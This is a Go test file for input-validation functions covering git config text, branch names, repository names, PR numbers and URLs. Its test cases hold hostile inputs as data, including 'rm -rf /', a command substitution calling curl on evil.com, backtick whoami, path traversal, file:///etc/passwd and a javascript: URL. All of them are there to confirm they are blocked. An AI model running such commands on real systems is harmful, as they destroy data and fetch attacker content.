package validate

import (
	"strings"
	"testing"
)

func TestSanitizeForGitConfig(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		expected string
	}{
		{
			name:     "normal text",
			input:    "normal title",
			expected: "normal title",
		},
		{
			name:     "removes semicolon",
			input:    "title; rm -rf /",
			expected: "title rm -rf /",
		},
		{
			name:     "removes all shell special characters",
			input:    "title;&&||`$()<>'\"\\",
			expected: "title",
		},
		{
			name:     "replaces newlines with spaces",
			input:    "title\nwith\nnewlines",
			expected: "title with newlines",
		},
		{
			name:     "replaces tabs with spaces",
			input:    "title\twith\ttabs",
			expected: "title with tabs",
		},
		{
			name:     "replaces carriage returns with spaces",
			input:    "title\rwith\rreturns",
			expected: "title with returns",
		},
		{
			name:     "removes null bytes",
			input:    "title\x00with\x00nulls",
			expected: "titlewithnulls",
		},
		{
			name:     "trims whitespace",
			input:    "  title with spaces  ",
			expected: "title with spaces",
		},
		{
			name:     "complex injection attempt",
			input:    "Fix $(curl evil.com) && rm -rf / || echo 'hacked'",
			expected: "Fix curl evil.com  rm -rf /  echo hacked",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := SanitizeForGitConfig(tt.input)
			if result != tt.expected {
				t.Errorf("SanitizeForGitConfig(%q) = %q, want %q", tt.input, result, tt.expected)
			}
		})
	}
}

func TestBranchName(t *testing.T) {
	tests := []struct {
		name    string
		input   string
		wantErr bool
		errMsg  string
	}{
		{
			name:    "valid branch name",
			input:   "feature/test",
			wantErr: false,
		},
		{
			name:    "valid with numbers",
			input:   "feature/test-123",
			wantErr: false,
		},
		{
			name:    "valid with dots",
			input:   "release-1.2.3",
			wantErr: false,
		},
		{
			name:    "command injection attempt",
			input:   "feature; rm -rf /",
			wantErr: true,
			errMsg:  "invalid branch name: contains unsafe characters",
		},
		{
			name:    "empty branch name",
			input:   "",
			wantErr: true,
			errMsg:  "branch name cannot be empty",
		},
		{
			name:    "starts with dash",
			input:   "-invalid",
			wantErr: true,
			errMsg:  "invalid branch name format",
		},
		{
			name:    "ends with slash",
			input:   "invalid/",
			wantErr: true,
			errMsg:  "invalid branch name format",
		},
		{
			name:    "too long branch name",
			input:   strings.Repeat("a", 256),
			wantErr: true,
			errMsg:  "branch name too long",
		},
		{
			name:    "contains special characters",
			input:   "feature@test",
			wantErr: true,
			errMsg:  "invalid branch name: contains unsafe characters",
		},
		{
			name:    "contains backticks",
			input:   "feature`whoami`",
			wantErr: true,
			errMsg:  "invalid branch name: contains unsafe characters",
		},
		{
			name:    "contains dollar sign",
			input:   "feature$USER",
			wantErr: true,
			errMsg:  "invalid branch name: contains unsafe characters",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := BranchName(tt.input)
			if (err != nil) != tt.wantErr {
				t.Errorf("BranchName(%q) error = %v, wantErr %v", tt.input, err, tt.wantErr)
				return
			}
			if err != nil && tt.errMsg != "" && err.Error() != tt.errMsg {
				t.Errorf("BranchName(%q) error = %v, want %v", tt.input, err.Error(), tt.errMsg)
			}
		})
	}
}

func TestRepoName(t *testing.T) {
	tests := []struct {
		name    string
		input   string
		wantErr bool
		errMsg  string
	}{
		{
			name:    "valid repo name",
			input:   "my-repo",
			wantErr: false,
		},
		{
			name:    "valid with dots",
			input:   "my.repo",
			wantErr: false,
		},
		{
			name:    "valid with underscores",
			input:   "my_repo",
			wantErr: false,
		},
		{
			name:    "empty repo name",
			input:   "",
			wantErr: true,
			errMsg:  "repository name cannot be empty",
		},
		{
			name:    "contains path traversal",
			input:   "../evil",
			wantErr: true,
			errMsg:  "repository name contains path traversal",
		},
		{
			name:    "contains path traversal in middle",
			input:   "repo/../evil",
			wantErr: true,
			errMsg:  "repository name contains path traversal",
		},
		{
			name:    "too long repo name",
			input:   strings.Repeat("a", 101),
			wantErr: true,
			errMsg:  "repository name too long",
		},
		{
			name:    "contains special characters",
			input:   "repo/name",
			wantErr: true,
			errMsg:  "invalid repository name: contains unsafe characters",
		},
		{
			name:    "contains spaces",
			input:   "repo name",
			wantErr: true,
			errMsg:  "invalid repository name: contains unsafe characters",
		},
		{
			name:    "contains shell characters",
			input:   "repo;echo",
			wantErr: true,
			errMsg:  "invalid repository name: contains unsafe characters",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := RepoName(tt.input)
			if (err != nil) != tt.wantErr {
				t.Errorf("RepoName(%q) error = %v, wantErr %v", tt.input, err, tt.wantErr)
				return
			}
			if err != nil && tt.errMsg != "" && err.Error() != tt.errMsg {
				t.Errorf("RepoName(%q) error = %v, want %v", tt.input, err.Error(), tt.errMsg)
			}
		})
	}
}

func TestPRNumber(t *testing.T) {
	tests := []struct {
		name    string
		input   int
		wantErr bool
		errMsg  string
	}{
		{
			name:    "valid PR number",
			input:   123,
			wantErr: false,
		},
		{
			name:    "valid small PR number",
			input:   1,
			wantErr: false,
		},
		{
			name:    "valid large PR number",
			input:   999999,
			wantErr: false,
		},
		{
			name:    "zero PR number",
			input:   0,
			wantErr: true,
			errMsg:  "invalid PR number: 0",
		},
		{
			name:    "negative PR number",
			input:   -1,
			wantErr: true,
			errMsg:  "invalid PR number: -1",
		},
		{
			name:    "too large PR number",
			input:   1000000,
			wantErr: true,
			errMsg:  "invalid PR number: 1000000",
		},
		{
			name:    "extremely large PR number",
			input:   9999999,
			wantErr: true,
			errMsg:  "invalid PR number: 9999999",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := PRNumber(tt.input)
			if (err != nil) != tt.wantErr {
				t.Errorf("PRNumber(%d) error = %v, wantErr %v", tt.input, err, tt.wantErr)
				return
			}
			if err != nil && tt.errMsg != "" && err.Error() != tt.errMsg {
				t.Errorf("PRNumber(%d) error = %v, want %v", tt.input, err.Error(), tt.errMsg)
			}
		})
	}
}

func TestURL(t *testing.T) {
	tests := []struct {
		name    string
		input   string
		wantErr bool
		errMsg  string
	}{
		{
			name:    "valid GitHub URL",
			input:   "https://github.com/owner/repo/pull/123",
			wantErr: false,
		},
		{
			name:    "valid GitHub URL with subdomain",
			input:   "https://github.com/owner/repo",
			wantErr: false,
		},
		{
			name:    "empty URL",
			input:   "",
			wantErr: true,
			errMsg:  "URL cannot be empty",
		},
		{
			name:    "non-HTTPS URL",
			input:   "http://github.com/owner/repo/pull/123",
			wantErr: true,
			errMsg:  "only HTTPS URLs are allowed",
		},
		{
			name:    "non-GitHub URL",
			input:   "https://gitlab.com/owner/repo/pull/123",
			wantErr: true,
			errMsg:  "only github.com URLs are allowed",
		},
		{
			name:    "malicious domain",
			input:   "https://evil.com/pull/123",
			wantErr: true,
			errMsg:  "only github.com URLs are allowed",
		},
		{
			name:    "file URL",
			input:   "file:///etc/passwd",
			wantErr: true,
			errMsg:  "only HTTPS URLs are allowed",
		},
		{
			name:    "javascript URL",
			input:   "javascript:alert(1)",
			wantErr: true,
			errMsg:  "only HTTPS URLs are allowed",
		},
		{
			name:    "invalid URL format",
			input:   "not a url at all",
			wantErr: true,
			errMsg:  "only HTTPS URLs are allowed",
		},
		{
			name:    "URL with credentials",
			input:   "https://user:pass@github.com/owner/repo",
			wantErr: true,
			errMsg:  "URL cannot contain credentials",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := URL(tt.input)
			if (err != nil) != tt.wantErr {
				t.Errorf("URL(%q) error = %v, wantErr %v", tt.input, err, tt.wantErr)
				return
			}
			if err != nil && tt.errMsg != "" && !strings.Contains(err.Error(), tt.errMsg) {
				t.Errorf("URL(%q) error = %v, want error containing %v", tt.input, err.Error(), tt.errMsg)
			}
		})
	}
}